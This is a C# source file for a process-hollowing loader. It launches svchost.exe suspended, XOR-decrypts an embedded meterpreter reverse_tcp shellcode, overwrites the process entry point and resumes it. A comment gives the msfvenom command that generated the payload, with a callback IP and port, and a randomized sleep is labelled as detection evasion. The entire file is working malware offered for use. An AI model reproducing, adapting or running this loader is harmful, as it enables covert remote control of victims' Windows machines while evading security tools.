﻿using System;
using static Process_Hollowing.Imports.Imports;

namespace Process_Hollowing
{
    class Program
    {
        public static void sleep()
        {
            var rand = new Random();
            uint randTime = (uint)rand.Next(10000, 20000);
            double decide = randTime / 1000 - 0.5;
            DateTime now = DateTime.Now;
            Console.WriteLine("[*] Sleeping for {0} seconds to evade detections...", randTime / 1000);
            Sleep(randTime);
            if (DateTime.Now.Subtract(now).TotalSeconds < decide)
            {
                return;
            }
        }

        public static void Hollow()
        {
            PROCESS_INFORMATION proc_info = new PROCESS_INFORMATION();
            STARTUPINFO startup_info = new STARTUPINFO();
            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();

            string path = @"C:\\Windows\\System32\\svchost.exe";
            bool procINIT = CreateProcess(null, path, IntPtr.Zero, IntPtr.Zero, false, CreationFlags.SUSPENDED,
                IntPtr.Zero, null, ref startup_info, ref proc_info);
            if (procINIT == true)
            {
                Console.WriteLine("[*] Process create successfully.");
                Console.WriteLine("[*] Process ID: {0}", proc_info.dwProcessId);
            }
            else
            {
                Console.WriteLine("[-] Could not create the process.");
            }

            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.49.115 LPORT=8080 -f csharp EXITFUNC=thread --encrypt xor --encrypt-key 'speranza'
            byte[] buf = new byte[511] {0x8f,0x38,0xe6,0x96,0x91,0x86,
0xb6,0x61,0x73,0x70,0x24,0x23,0x20,0x3e,0x28,0x30,0x3b,0x41,
0xb7,0x17,0x29,0xe5,0x28,0x01,0x3b,0xfb,0x37,0x6a,0x37,0x26,
0xf1,0x33,0x53,0x38,0x6a,0xc5,0x2b,0x24,0x37,0x50,0xba,0x38,
0xee,0x00,0x31,0x26,0x4b,0xa1,0xdf,0x4c,0x04,0x0e,0x63,0x42,
0x5a,0x20,0xb2,0xb9,0x68,0x33,0x60,0xaf,0x98,0x8c,0x21,0x38,
0xee,0x20,0x41,0x2f,0x2b,0xea,0x31,0x4c,0x2d,0x73,0xb1,0x08,
0xfb,0x19,0x6b,0x7b,0x67,0x7d,0xe4,0x1c,0x7a,0x61,0x73,0xfb,
0xe5,0xfa,0x61,0x6e,0x7a,0x29,0xf6,0xb0,0x11,0x15,0x29,0x6f,
0xaa,0xea,0x3b,0x68,0x35,0x36,0xea,0x2e,0x5a,0x28,0x72,0xa0,
0x86,0x24,0x29,0x91,0xb3,0x2c,0x42,0xb9,0x24,0xf9,0x55,0xe6,
0x32,0x60,0xa5,0x38,0x54,0xb2,0x20,0xaf,0xb3,0x6c,0xdf,0x31,
0x64,0xb3,0x59,0x8e,0x0f,0x90,0x3f,0x73,0x29,0x56,0x69,0x2b,
0x43,0xb0,0x06,0xa8,0x3d,0x36,0xea,0x2e,0x5e,0x28,0x72,0xa0,
0x03,0x33,0xea,0x62,0x32,0x25,0xf8,0x30,0x79,0x3b,0x60,0xbe,
0x3b,0xea,0x77,0xf8,0x24,0x2a,0x20,0x36,0x24,0x38,0x3b,0x71,
0xb5,0x28,0x20,0x36,0x3b,0x38,0x32,0x2a,0x2d,0xf1,0x8d,0x4e,
0x3b,0x33,0x8c,0x90,0x3d,0x33,0x38,0x34,0x32,0xea,0x61,0x99,
0x2e,0x8d,0x9e,0x91,0x27,0x28,0xcd,0x07,0x16,0x40,0x3e,0x5d,
0x48,0x61,0x73,0x31,0x33,0x3b,0xe8,0x88,0x32,0xe0,0x9f,0xd0,
0x64,0x72,0x61,0x27,0xf3,0x84,0x3a,0xcc,0x67,0x72,0x7e,0xfe,
0xba,0xc9,0x42,0x03,0x24,0x26,0x28,0xe7,0x9e,0x2d,0xfa,0x81,
0x24,0xc8,0x2d,0x19,0x5c,0x66,0x8c,0xa5,0x29,0xfb,0x8b,0x06,
0x7b,0x60,0x73,0x70,0x3c,0x33,0xdb,0x47,0xfa,0x0a,0x73,0x8f,
0xb0,0x18,0x6b,0x2f,0x24,0x31,0x23,0x3d,0x54,0xbb,0x2c,0x5f,
0xba,0x29,0x8c,0xb0,0x2d,0xfb,0xa3,0x26,0x85,0xa1,0x3b,0xf9,
0xa4,0x33,0xdb,0x84,0x75,0xbe,0x93,0x8f,0xb0,0x3a,0xe8,0xa9,
0x10,0x71,0x32,0x28,0x29,0xfb,0x83,0x26,0xf3,0x98,0x32,0xca,
0xfc,0xd7,0x15,0x0f,0x85,0xb4,0xf6,0xb0,0x11,0x78,0x28,0x91,
0xb4,0x14,0x96,0x98,0xf6,0x72,0x61,0x6e,0x32,0xe2,0x9f,0x60,
0x2d,0xfb,0x83,0x23,0x4b,0xa8,0x19,0x74,0x24,0x2a,0x29,0xe7,
0x83,0x20,0xc9,0x72,0xbc,0xba,0x3e,0x91,0xaf,0xe2,0x8b,0x70,
0x1b,0x27,0x29,0xed,0xbe,0x41,0x2d,0xf9,0x93,0x18,0x21,0x2f,
0x23,0x09,0x73,0x60,0x65,0x72,0x20,0x36,0x32,0xe8,0x81,0x38,
0x54,0xbb,0x20,0xd4,0x22,0xc5,0x20,0x95,0x9a,0xa7,0x29,0xe7,
0xb9,0x28,0xfa,0xb7,0x28,0x43,0xa8,0x27,0xf3,0x91,0x3b,0xf9,
0xbf,0x3a,0xe8,0x97,0x3b,0xdb,0x71,0xa9,0xad,0x2d,0x9e,0xbb,
0xf9,0x99,0x73,0x0d,0x4d,0x2a,0x20,0x39,0x23,0x09,0x73,0x30,
0x65,0x72,0x20,0x36,0x10,0x61,0x29,0x31,0xdf,0x79,0x4e,0x61,
0x4a,0x9e,0xa6,0x27,0x3c,0x33,0xdb,0x1b,0x14,0x2c,0x12,0x8f,
0xb0,0x3b,0x9e,0xa0,0x93,0x5d,0x8c,0x8f,0x9a,0x3a,0x60,0xad,
0x32,0x48,0xb5,0x38,0xe0,0x84,0x14,0xda,0x3b,0x9e,0x94,0x28,
0x0f,0x72,0x38,0xd5,0x9a,0x7c,0x59,0x7a,0x24,0xfb,0xbb,0x91,
0xaf};
            String Keys = "speranza";
            int y = -1;
            for (int i = 0; i < buf.Length; i++)
            {
                y++;
                if (y >= Keys.Length) { y = 0; }
                buf[i] = (byte)(buf[i] ^ Keys[y]);
            }

            uint retLength = 0;
            IntPtr procHandle = proc_info.hProcess;
            IntPtr threadHandle = proc_info.hThread;
            ZwQueryInformationProcess(procHandle, PROCESSBASICINFORMATION, ref pbi, (uint)(IntPtr.Size * 6), ref retLength);
            IntPtr imageBaseAddr = (IntPtr)((Int64)pbi.PebAddress + 0x10);
            Console.WriteLine("[*] Image Base Address found: 0x{0}", imageBaseAddr.ToString("x"));

            byte[] baseAddrBytes = new byte[0x8];
            IntPtr lpNumberofBytesRead = IntPtr.Zero;
            ReadProcessMemory(procHandle, imageBaseAddr, baseAddrBytes, baseAddrBytes.Length, out lpNumberofBytesRead);
            IntPtr execAddr = (IntPtr)(BitConverter.ToInt64(baseAddrBytes, 0));

            byte[] data = new byte[0x200];
            ReadProcessMemory(procHandle, execAddr, data, data.Length, out lpNumberofBytesRead);
            uint e_lfanew = BitConverter.ToUInt32(data, 0x3C);
            Console.WriteLine("[*] e_lfanew: 0x{0}", e_lfanew.ToString("X"));

            uint rvaOffset = e_lfanew + 0x28;
            uint rva = BitConverter.ToUInt32(data, (int)rvaOffset);
            IntPtr entrypointAddr = (IntPtr)((UInt64)execAddr + rva);
            Console.WriteLine("[*] Entrypoint Found: 0x{0}", entrypointAddr.ToString("X"));

            IntPtr lpNumberOfBytesWritten = IntPtr.Zero;
            WriteProcessMemory(procHandle, entrypointAddr, buf, buf.Length, ref lpNumberOfBytesWritten);
            Console.WriteLine("[*] Memory written. Resuming thread...");
            ResumeThread(threadHandle);
        }
        static void Main(string[] args)
        {
            sleep();
            Hollow();
        }
    }
}
